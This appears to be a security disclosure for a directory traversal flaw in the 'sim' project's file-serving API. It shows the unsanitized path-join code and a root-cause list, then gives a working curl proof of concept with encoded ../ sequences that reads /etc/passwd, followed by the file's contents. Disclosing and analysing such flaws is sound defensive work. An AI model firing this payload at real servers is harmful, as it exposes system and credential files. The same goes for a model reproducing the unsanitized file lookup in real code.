Directory Traversal Vulnerability Analysis

This report provides a comprehensive analysis of a critical directory traversal
  vulnerability in the file serving endpoint (/api/files/serve/[...path]/route.ts). The
  vulnerability allows attackers to read arbitrary files from the server's file system by
  exploiting insufficient path validation.

```bash
git clone https://github.com/simstudioai/sim.git
cd sim/
sudo docker compose -f docker-compose.prod.yml up -d
```

## Vulnerability Details

```javascript
  // In /app/api/files/serve/[...path]/route.ts:66-67
  return await handleLocalFile(fullPath)

  // In /app/api/files/serve/[...path]/route.ts:82-84
  async function handleLocalFile(filename: string): Promise<NextResponse> {
    const filePath = findLocalFile(filename)

  Root Cause in /app/api/files/utils.ts:165-167:

  export function findLocalFile(filename: string): string | null {
    const possiblePaths = [join(UPLOAD_DIR, filename), join(process.cwd(), 'uploads',
  filename)]

    for (const path of possiblePaths) {
      if (existsSync(path)) {
        return path
      }
    }

    return null
  }

```

##  Root Cause Analysis

  1. No Path Sanitization: The filename parameter is used directly without sanitization
  2. No Path Traversal Protection: No protection against ../ sequences
  3. No Path Normalization: No use of path.normalize() or similar
  4. No Base Path Validation: No verification that the final path stays within allowed
  directories
  5. Insufficient Directory Checks: Only checks if file exists, not if it's within allowed
  bounds

  Malicious URL → Path segments → fullPath → findLocalFile() → Arbitrary file read



```bash
curl "http://IP:3000/api/files/serve/%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd"

root:x:0:0:root:/root:/bin/sh
bin:x:1:1:bin:/bin:/sbin/nologin
daemon:x:2:2:daemon:/sbin:/sbin/nologin
lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin
sync:x:5:0:sync:/sbin:/bin/sync
shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown
halt:x:7:0:halt:/sbin:/sbin/halt
mail:x:8:12:mail:/var/mail:/sbin/nologin
news:x:9:13:news:/usr/lib/news:/sbin/nologin
uucp:x:10:14:uucp:/var/spool/uucppublic:/sbin/nologin
cron:x:16:16:cron:/var/spool/cron:/sbin/nologin
ftp:x:21:21::/var/lib/ftp:/sbin/nologin
sshd:x:22:22:sshd:/dev/null:/sbin/nologin
games:x:35:35:games:/usr/games:/sbin/nologin
ntp:x:123:123:NTP:/var/empty:/sbin/nologin
guest:x:405:100:guest:/dev/null:/sbin/nologin
nobody:x:65534:65534:nobody:/:/sbin/nologin
bun:x:1000:1000:Linux User,,,:/home/bun:/bin/sh
```